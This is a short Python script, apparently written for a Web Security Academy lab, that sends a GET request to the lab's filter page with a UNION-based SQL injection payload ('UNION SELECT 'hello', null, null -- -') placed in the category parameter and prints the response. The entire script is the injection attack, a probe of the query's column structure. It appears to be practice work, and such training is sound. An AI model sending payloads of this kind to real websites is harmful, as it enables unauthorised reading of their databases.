import requests

response = requests.get('https://0a9b0063039220f38084852600080093.web-security-academy.net/filter',params = {f'category':'Clothing, shoes and accessories\' UNION SELECT \'hello\', null, null -- -'})

print(response.text)